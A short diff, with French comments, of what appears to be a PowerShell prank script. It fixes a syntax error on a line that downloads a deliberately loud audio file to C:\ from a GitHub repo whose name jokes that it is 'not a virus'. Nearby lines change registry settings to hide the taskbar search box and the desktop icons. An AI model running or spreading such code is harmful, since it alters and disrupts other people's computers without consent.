@@ -42,7 +42,7 @@ Function Set-WallPaper($Image) {
   #cense cacher la taskbar mais ça marche pas
   Set-ItemProperty -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Search -Name SearchBoxTaskbarMode -Value 0 -Type DWord -Force
 
-  $WebClient.DownloadFile("https://github.com/MilkrosoftWindows/tkt_poto_walah_c_pa_un_virus/raw/main/monster-inc-mike-wazowski-theme-song-earrape-best-version.mp3", "C:\zic.mp3")"));
+  $WebClient.DownloadFile("https://github.com/MilkrosoftWindows/tkt_poto_walah_c_pa_un_virus/raw/main/monster-inc-mike-wazowski-theme-song-earrape-best-version.mp3", "C:\zic.mp3")
 
   $Path="HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\" 
   Set-ItemProperty -Path $Path -Name "HideIcons" -Value 1 # cacher icones desktop
